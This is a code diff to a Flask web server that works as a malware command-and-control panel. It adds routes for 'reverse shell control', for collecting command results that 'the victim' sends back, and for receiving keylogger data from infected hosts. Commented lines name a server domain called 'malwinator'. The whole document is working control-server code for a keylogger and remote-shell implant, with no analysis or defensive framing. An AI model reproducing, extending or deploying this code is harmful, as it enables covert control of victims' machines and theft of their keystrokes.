@@ -14,12 +14,23 @@ app = Flask(__name__)
 '''
 hosts = {}
 
+def send_command(name, ip, command):
+  global hosts
+  key = (ip, name)
+  
+  hosts[key]['command'] = command
+  if hosts[key]['lock'].locked():
+    hosts[key]['lock'].release()
+    return 0
+  
+  return 1
+
 # server handshake to keep track of each host
 @app.route('/handshake', methods = ['POST'])
 def handshake():
   global hosts
   key = (request.remote_addr, request.form['name'])
-  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : ['']}
+  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 'command_result' : ''}
   hosts[key]['lock'].acquire()
   return 'Request accepted', 200
 
@@ -56,15 +67,6 @@ def pong():
 
   return 'Pong sent.', 200
 
-@app.route('/log', methods = ['POST'])
-def log_post():
-  global hosts
-  
-  # this is where the host can send it's keylog data
-  key = (request.remote_addr, request.form['name'])
-  hosts[key]['log'].append(request.form['key'])
-
-  return 'Ok', 200
 
 #interface routes
 @app.route('/')
@@ -112,16 +114,50 @@ def send_process():
   global hosts
   name = request.form['name']
   ip = request.form['ip']
-  key = (ip, name)
   command = request.form['command'] 
+  if not send_command(name, ip, command):
+    return "Ok", 200
+  return "Command failed!", 200
+
+# the route for reverse shell contorl
+@app.route('/shell', methods = ['GET', 'POST'])
+def shell():
+  global hosts 
   
-  hosts[key]['command'] = command
-  if hosts[key]['lock'].locked():
-    hosts[key]['lock'].release()
-    return 0
+  if request.method == 'GET':
+    name = request.args.get('name')
+    ip = request.args.get('ip')
+
+    return render_template('command.html', name = name, ip = ip)
   
-  return 1
+  elif request.method == 'POST':
+    name = request.form['name']
+    ip = request.form['ip']
+    command = request.form['command'] 
+    if send_command(name, ip, "shell "+ command):
+      hosts[(ip,name)]['command_result'] = "Command failed!"
+    return render_template('command.html', name = name, ip = ip, last_command=command)
+    
+@app.route('/result', methods = ['POST'])
+def result():
+  global hosts
   
+  # this is where the victim will send the command result
+  key = (request.remote_addr, request.form['name'])
+  hosts[key]['command_result'] = request.form['result']
+
+  return 'Ok', 200
+
+@app.route('/getResult', methods = ['POST'])
+def get_result():
+  global hosts
+  
+  # this is where the web browser will call for the command result
+  key = (request.remote_addr, request.form['name'])
+  return ''.join(hosts[key]['command_result'])
+
+
+# the route for keylogger control
 @app.route('/getLog', methods = ['GET', 'POST'])
 def getLog():
   global hosts
@@ -137,10 +173,28 @@ def getLog():
     ip = request.form['ip']
     key = (ip, name)
     return ''.join(hosts[key]['log'])
+  
+  return "Method not allowed", 403
 
 
+@app.route('/log', methods = ['POST'])
+def log_post():
+  global hosts
+  
+  # this is where the host can send it's keylog data
+  key = (request.remote_addr, request.form['name'])
+  hosts[key]['log'].append(request.form['key'])
+
+  return 'Ok', 200
+
+# https server
 # if __name__ == '__main__':
 #   app.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
 
+# http server
+# if __name__ == "__main__":
+#   app.run(host='0.0.0.0', port='8081')
+
+# localhost server
 if __name__ == "__main__":
   app.run(host='127.0.0.1', port='8088')
